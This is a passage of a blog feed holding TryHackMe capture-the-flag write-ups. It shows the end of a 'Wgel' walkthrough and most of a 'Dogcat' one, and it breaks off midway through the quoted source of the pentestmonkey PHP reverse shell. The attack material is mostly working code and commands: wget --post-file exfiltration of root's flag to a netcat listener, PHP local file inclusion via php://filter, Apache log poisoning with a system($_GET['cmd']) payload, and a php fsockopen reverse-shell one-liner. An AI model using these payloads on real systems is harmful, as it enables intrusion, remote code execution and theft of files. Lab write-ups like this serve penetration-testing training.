href="https://gtfobins.github.io/gtfobins/wget/" target="_blank" rel="noopener">this</a> for wget.</p><h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>It seems like we can download files to another machine. We can use that knowledge to directly exfiltrate the root flag.<br>(Trust me it took me ages to figure that one out. I first tried to download /etc/shadow and simliar.)</p><p>So on my machine I listened for incoming connections on port 80 and stored the output in a file called “root_flag.txt”:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@hades      :~/ctf/thm/wgel<span class="comment"># nc -lnvp 80 &gt; root_flag.txt</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::80</span><br><span class="line">Ncat: Listening on 0.0.0.0:80</span><br><span class="line">Ncat: Connection from 10.10.54.255.</span><br><span class="line">Ncat: Connection from 10.10.54.255:36442.</span><br></pre></td></tr></table></figure><p>On the target machine I used wget with the “–post-file” flag to send the root flag to my machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt <span class="variable">$YOUR_IP</span></span><br><span class="line">--2020-08-07 18:11:21--  http://<span class="variable">$YOUR_IP</span>/</span><br><span class="line">Connecting to <span class="variable">$YOUR_IP</span>:80... connected.</span><br><span class="line">HTTP request sent, awaiting response...</span><br></pre></td></tr></table></figure><p>You should now be able to cat out the root flag in the “root_flag.txt” file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hades:~/ctf/thm/wgel<span class="comment"># cat root_flag.txt</span></span><br><span class="line">ROOT_FLAG</span><br></pre></td></tr></table></figure><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>]]></content>
      
      
      <categories>
          
          <category> pentesting </category>
          
          <category> writeups </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dogcat - TryHackMe</title>
      <link href="/2020/07/11/Dogcat-TryHackMe/"/>
      <url>/2020/07/11/Dogcat-TryHackMe/</url>
      
        <content type="html"><![CDATA[<p>Hey there! Today I am going to walk you through the Dogcat machine on <a href="https://tryhackme.com/room/dogcat" target="_blank" rel="noopener">TryHackMe</a></p><p>The first thing I always do is to export the IP to a global variable. So from now on $IP will refer to the IP of the target machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> IP=&#123;Machine IP&#125;</span><br></pre></td></tr></table></figure><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>So as always let’s start with an nmap scan.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oN nmap/initial</span><br></pre></td></tr></table></figure><p>This is what came back:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-10 06:27 EDT</span><br><span class="line">Nmap scan report for 10.10.39.107</span><br><span class="line">Host is up (0.045s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)</span><br><span class="line">|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)</span><br><span class="line">|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: dogcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds</span><br></pre></td></tr></table></figure><p>So as we can see, there is a webserver on port 80 and a ssh access. We should first have a look at the webserver, as we can’t really do anything to the shh port at the moment.</p><h2 id="Gaining-Access"><a href="#Gaining-Access" class="headerlink" title="Gaining Access"></a>Gaining Access</h2><p>We are greeted with a webpage about dog and cat pictures. If we click on one of the buttons we get either a picture of a dog or a cat respectively. On first glance there is no obvious entry point we could exploit, but if we have a look at the URL we should notice somehthing.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=dog</span><br></pre></td></tr></table></figure><p>Once we clicked on a button the URL has a view parameter with “dog” or “cat” assigned. I instantly thought of Local File Inclusion (LFI), so let’s try something:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd</span><br></pre></td></tr></table></figure><p>But sadly the developer of the webpage took care of that and checks wether or not “dog” or “cat” is in the value of the view parameter, so once we write “dog” somewhere in the path, we see this:</p><img src="/2020/07/11/Dogcat-TryHackMe/lfi.png" class="" title="LFI"><p>Apparently warnings were not disabled in the php settings, so we can see that there was an error in the “include()” function. We can also see that the contents of the view parameter are being passed straight into that function, and that they automatically append a .php extension, somewhere in the code.</p><p>So what can we do with this information? We need to find a way to exfiltrate information from that webpage. I came accross <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/" target="_blank" rel="noopener">this</a> website. Let’s try this:</p><img src="/2020/07/11/Dogcat-TryHackMe/lfi2.png" class="" title="LFI"><p>Awesome it worked!</p><p>Of course this is still base64, but we can easily decode that online for example <a href="https://www.base64decode.org/" target="_blank" rel="noopener">here</a>.<br>Just to recap, we used this URL:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/convert.base64-encode/resource=./dog/../index</span><br></pre></td></tr></table></figure><p>To show the code of the index page, encoded in base64. If we deocde this, we can see the source code of the index page, which let’s us see what is going on under the hood.</p><p>The exfiltrated code:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;dogcat&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"/style.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;dogcat&lt;/h1&gt;</span><br><span class="line">    &lt;i&gt;a gallery of various dogs <span class="keyword">or</span> cats&lt;/i&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;What would you like to see?&lt;/h2&gt;</span><br><span class="line">        &lt;a href=<span class="string">"/?view=dog"</span>&gt;&lt;button id=<span class="string">"dog"</span>&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=<span class="string">"/?view=cat"</span>&gt;&lt;button id=<span class="string">"cat"</span>&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">containsStr</span><span class="params">($str, $substr)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> strpos($str, $substr) !== <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    $ext = <span class="keyword">isset</span>($_GET[<span class="string">"ext"</span>]) ? $_GET[<span class="string">"ext"</span>] : <span class="string">'.php'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'view'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(containsStr($_GET[<span class="string">'view'</span>], <span class="string">'dog'</span>) || containsStr($_GET[<span class="string">'view'</span>], <span class="string">'cat'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Here you go!'</span>;</span><br><span class="line">                    <span class="keyword">include</span> $_GET[<span class="string">'view'</span>] . $ext;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Sorry, only dogs or cats are allowed.'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Now we can see what is going on with the automatic .php extension.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ext = <span class="keyword">isset</span>($_GET[<span class="string">"ext"</span>]) ? $_GET[<span class="string">"ext"</span>] : <span class="string">'.php'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'view'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(containsStr($_GET[<span class="string">'view'</span>], <span class="string">'dog'</span>) || containsStr($_GET[<span class="string">'view'</span>], <span class="string">'cat'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Here you go!'</span>;</span><br><span class="line">                    <span class="keyword">include</span> $_GET[<span class="string">'view'</span>] . $ext;</span><br></pre></td></tr></table></figure><p>If you don’t know php, here is what it basically does:<br>It checks if there is a “ext” parameter in the URL. If there is not, it uses a .php extension and else it uses whatever it was given in the URL. Then of course it includes whatever file is specified in the view parameter, with the given extension.</p><p>With this knowledge we can things like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.39.107/?view=php://filter/resource=./dog/../../../../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure><p>To extraxt the linux password file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>Sadly we can not find any passwords or anything else interesting here, so we have to dig deeper.</p><p>The next thing we should try is log poisining. We are really just injecting a pice of php code into the log, to get remote code execution. Let’s first check where the log is. From our nmap scan we know that it is an apache2 server. So just try all the default locations. This is where I found it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure><p>This is a snippet of the log:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;YOUR_IP&#125; - - [10&#x2F;Jul&#x2F;2020:10:27:35 +0000] &quot;GET &#x2F;cats&#x2F;4.jpg HTTP&#x2F;1.1&quot; 200 17994 &quot;http:&#x2F;&#x2F;$IP&#x2F;?view&#x3D;cat&quot; &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0&quot;</span><br></pre></td></tr></table></figure><p>It’s syntax is like this:</p><p><strong>{ACCESSING_IP} - - [TIME] “{REQUEST}” {RESPONSE_CODE} {I_DUNNO} “{URL}” “{USER_AGENT}”</strong></p><p>The part we can modify to display php code, is the User Agent.</p><p>You can either do this with a python script or with Burp-Suite.<br>Here is the python script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://$IP/?view=cat'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'&lt;?php system($_GET['</span>cmd<span class="string">']); ?&gt;'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>But I did it with Burp as well.</p><p>If you want a more detailed description just google how to edit a User Agent with Burp-Suite.</p><img src="/2020/07/11/Dogcat-TryHackMe/burp.png" class="" title="Burp-Suite"><p>We now have remote code execution, by passing a linux command to the “cmd” paramter in the URL. We can see the results of that command if we open up the log file again. So if we try to run “whoami” like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p>We can see this result in the logs (To find it more quickly the next time, copy the time stamp where the result of the whoami command showed up and search for it the next time. Then you will jump to the correct line automatically):</p><img src="/2020/07/11/Dogcat-TryHackMe/logpoisining.png" class="" title="Logpoisining"><p>As expected we are “www-data”.</p><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h3><p>To get an overview of what we are working with let’s also run “ls -l”.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=ls%20<span class="_">-l</span></span><br></pre></td></tr></table></figure><img src="/2020/07/11/Dogcat-TryHackMe/flag1.png" class="" title="lsResults"><p>Oh hey, there we have our first flag! We can see the content of the file like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=cat%20flag.php</span><br></pre></td></tr></table></figure><p><em>It is in the current working directory (/var/www/html/)</em></p><p>The result:</p><img src="/2020/07/11/Dogcat-TryHackMe/flag1.1.png" class="" title="flag1"><h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h3><p>The second flag is pretty much as easy as the first one, it is just one directory up.</p><p><em>One up from the current directory (/var/www/)</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=ls%20<span class="_">-l</span>%20..</span><br></pre></td></tr></table></figure><img src="/2020/07/11/Dogcat-TryHackMe/flag2.png" class="" title="flag2ls"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=cat ../flag2_QMW7JvaY2LvK.txt</span><br></pre></td></tr></table></figure><img src="/2020/07/11/Dogcat-TryHackMe/flag2.2.png" class="" title="flag2"><p>For the 3rd and 4th flag we will need a proper reverse shell with root access. I couldn’t get a shell by running a reverse shell from the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">PentestMonkey-ReverseShell-CheatSheet</a>, like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="variable">$IP</span>/?view=php://filter/resource=./dog/../../../../../../../var/<span class="built_in">log</span>/apache2/access.log&amp;ext=&amp;cmd=php -r <span class="string">'$sock=fsockopen("&#123;TUN0&#125;"",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>Maybe it was just me, but I decided to just download a php reverse shell from my computer with curl.</p><p>For that I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">this</a> reverse shell and modified it with my ip and the 9999 port.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">''</span>;  <span class="comment">// Your tun0 ip (ifconfig in terminal)</span></span><br><span class="line">$port = <span class="number">9999</span>;</span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">'pcntl_fork'</span>)) &#123;</span><br><span 